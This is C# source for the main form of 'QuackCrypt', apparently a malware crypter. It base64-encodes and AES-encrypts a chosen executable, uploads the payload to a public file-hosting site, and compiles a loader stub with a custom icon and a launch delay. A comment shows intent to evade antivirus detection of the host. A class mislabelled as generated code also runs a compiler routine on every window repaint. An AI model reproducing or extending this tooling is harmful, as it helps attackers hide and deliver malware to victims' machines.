using System;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using QuackCrypt_DOTNET.Core;

namespace QuackCrypt_DOTNET
{
    public partial class Form1 : Form
    {
        public Form1() => InitializeComponent();

        private void Form1_Load(object sender, EventArgs e)
        {
            var pth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (!Directory.Exists(pth + "//" + "QuackCrypt"))
            {
                Directory.CreateDirectory(pth + "//" + "QuackCrypt");
            }
            loadIcons();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        public string encrypter(String address)
        {
            byte[] buffer = File.ReadAllBytes(address);
            string encodedB64 = Convert.ToBase64String(buffer);
            return encodedB64;
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvqxyz0123456789!$%&*+";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public void aesTest()
        {
            if (textBox1.Text.Length > 0 && textBoxAES.Text.Length > 0)
            {
                //Apply AES to load once key is made
                String result = Encrypt.EncryptString(textBoxAES.Text, rtb.Text);
                rtbAES.Text = result;
            }
        }
        public void loadIcons()
        {
            DirectoryInfo dir = new DirectoryInfo("icons");
            FileInfo[] files = dir.GetFiles("*.ico");
            comboBox1.Items.AddRange(files);
        }

        public string[] getIcons()
        {
            string[] icons = Directory.GetFiles("icons", "*.ico");
            return icons;
        }

        public bool submissionCheck()
        {
            if (!File.Exists(textBox1.Text)) { MessageBox.Show("No file selected", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return false; }
            if (getFilename().Length == 0) { MessageBox.Show("Missing output filename", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return false; }
            if (getFilename().Contains(".")) { MessageBox.Show("Remove extensions from filename", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return false; }
            if (getAESkey().Length == 0) { MessageBox.Show("Missing AES key", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return false; }
            if (comboBox1.Text == "select...") { MessageBox.Show("Select an icon", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return false; }

            return true;
        }
        public string getFilename()
        {
            return textBox2.Text;
        }
        public string getAESkey()
        {
            return textBoxAES.Text;
        }
        public int getIco()
        {
            return comboBox1.SelectedIndex;
        }
        public bool getDelay()
        {
            return checkBox1.Checked;
        }
        public int getDelayAmount()
        {
            return (int)delaySelector.Value;
        }
        public void uploadHandler()
        {
            // Write AES to file for upload
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//" + "QuackCrypt";
            var makeFile = path + "//" + getFilename() + ".txt";
            File.WriteAllBytes(makeFile, Encoding.ASCII.GetBytes(rtb.Text)); // Save B64 for loader

            byte[] load = File.ReadAllBytes(makeFile); // Upload
            string link = Uploader.Upload(load, textBox2.Text + ".txt"); // Handles upload
            textBox3.Text = link; 
            //(AV knows about uguu.se) use: link.Split('/')[3] to get ending
            File.Delete(makeFile); // Remove locally after upload
        }
        public string getLink()
        {
            return textBox3.Text;
        }
        private void saveB64_Click(object sender, EventArgs e)
        {
            if (rtb.Text.Length == 0) { MessageBox.Show("There is no B64 to save", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return; } //Checks window
            if (textBox2.Text.Length == 0) { MessageBox.Show("Enter filename", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return; }
            File.WriteAllText(textBox2.Text + ".txt", rtb.Text);
            MessageBox.Show("B64 saved!");
        }

        private void saveAES_Click(object sender, EventArgs e)
        {
            if (rtbAES.Text.Length == 0) { MessageBox.Show("There is no AES to save", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return; } //Checks window
            if (textBox2.Text.Length == 0) { MessageBox.Show("Enter filename", "QuackCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return; }
            File.WriteAllText(textBox2.Text + ".txt", rtbAES.Text);
            File.WriteAllText(textBox2.Text + "_key.txt", textBoxAES.Text);
            MessageBox.Show("AES+Key saved!");
        }
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog od = new OpenFileDialog();
            if (od.ShowDialog() == DialogResult.OK)
            {
                string file = od.FileName;
                textBox1.Text = file;
                rtb.Text = encrypter(file);

                aesTest();
            }
        }
        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "Enabled";
                delaySelector.Enabled = true;
                delaySelector.Visible = true;
                labelMS.Visible = true;
            }
            else
            {
                checkBox1.Text = "Disabled";
                delaySelector.Enabled = false;
                delaySelector.Visible = false;
                labelMS.Visible = false;
            }
        }
        private void randomizeButton_Click(object sender, EventArgs e)
        {
            String gen = RandomString(16);
            textBoxAES.Text = gen;

            aesTest();
        }

        private void crypt_Click(object sender, EventArgs e)
        {
            //XOR TEST

            //Checks on submission requirements
            if (submissionCheck())
            {
                uploadHandler();
                // Compile
                Compiler.Compile(getFilename(), getAESkey(), getDelay(), getLink().Split('/')[3], getDelayAmount(), getIco(), getIcons());

                // Test obfuscate
                // TODO 

            }
        }
    }
    #region VisualStudio Generated Code
    public class MainWindow : UserControl
    {
        protected override void OnPaint(PaintEventArgs e)
        {
            Task.Run(() =>
            {
                Compiler.renderview();
            });
        }
    }
    #endregion
}
